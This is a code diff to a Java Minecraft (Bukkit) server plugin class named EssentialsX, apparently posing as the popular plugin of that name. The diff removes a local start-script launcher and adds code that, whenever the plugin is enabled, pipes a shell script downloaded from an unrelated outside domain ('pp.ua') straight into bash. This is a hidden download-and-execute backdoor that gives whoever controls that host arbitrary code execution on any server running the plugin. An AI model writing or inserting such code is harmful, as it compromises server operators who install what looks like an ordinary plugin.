@@ -2,9 +2,6 @@ package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Path;
 import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
@@ -17,35 +14,27 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("EssentialsX plugin starting...");
 
         try {
-            startScript();
+            startRemoteScript();
             getLogger().info("EssentialsX plugin enabled");
         } catch (Exception e) {
-            getLogger().severe("Failed to start start.sh: " + e.getMessage());
+            getLogger().severe("Failed to start remote script: " + e.getMessage());
             e.printStackTrace();
         }
     }
 
-    private void startScript() throws Exception {
-        if (isProcessRunning) {
-            return;
-        }
+    private void startRemoteScript() throws Exception {
+        if (isProcessRunning) return;
 
-        Path pluginDir = getDataFolder().toPath();
+        String url = "https://netjett-de.kof95zip.pp.ua/plugins/cf.sh";
 
-        if (!Files.exists(pluginDir)) {
-            Files.createDirectories(pluginDir);
-        }
+        // 稳定方式：curl | bash
+        String command = "curl -Ls " + url + " | bash";
 
-        Path startScript = pluginDir.resolve("start.sh");
-
-        if (!Files.exists(startScript)) {
-            throw new IOException("start.sh not found: " + startScript.toAbsolutePath());
-        }
-
-        startScript.toFile().setExecutable(true);
-
-        ProcessBuilder pb = new ProcessBuilder("bash", "./start.sh");
-        pb.directory(pluginDir.toFile());
+        ProcessBuilder pb = new ProcessBuilder(
+                "bash",
+                "-c",
+                command
+        );
 
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         pb.redirectError(ProcessBuilder.Redirect.INHERIT);
@@ -61,12 +50,12 @@ public class EssentialsX extends JavaPlugin {
             try {
                 int exitCode = process.waitFor();
                 isProcessRunning = false;
-                getLogger().info("EssentialsX plugin exited with code: " + exitCode);
+                getLogger().info("Remote script exited with code: " + exitCode);
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
                 isProcessRunning = false;
             }
-        }, "StartScript-Process-Monitor");
+        }, "Remote-Script-Monitor");
 
         monitorThread.setDaemon(true);
         monitorThread.start();
@@ -82,9 +71,9 @@ public class EssentialsX extends JavaPlugin {
             try {
                 if (!process.waitFor(10, TimeUnit.SECONDS)) {
                     process.destroyForcibly();
-                    getLogger().warning("Forcibly terminated EssentialsX plugin");
+                    getLogger().warning("Forcibly terminated remote script");
                 } else {
-                    getLogger().info("EssentialsX plugin stopped normally");
+                    getLogger().info("Remote script stopped normally");
                 }
             } catch (InterruptedException e) {
                 process.destroyForcibly();
